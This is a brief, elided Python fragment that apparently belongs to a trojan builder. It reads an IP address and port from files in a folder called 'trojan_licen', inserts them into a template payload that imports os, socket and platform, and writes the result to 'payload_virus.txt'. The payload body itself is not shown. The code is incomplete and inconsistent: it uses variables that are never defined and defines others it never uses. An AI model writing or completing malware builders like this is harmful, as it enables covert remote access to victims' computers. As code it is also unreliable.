...
he=open(R"C:\Users\MRX\source\trojan_licen\port.txt","r").read()
name=open(R"C:\Users\MRX\source\trojan_licen\ip.txt","r").read()
text="""
import os
import socket
import platform
...
full_text=str(text)+str(ipo)+str(port)+str(text2)

file159=open(R"C:\Users\MRX\source\payload_virus.txt","w").write(str(full_text))
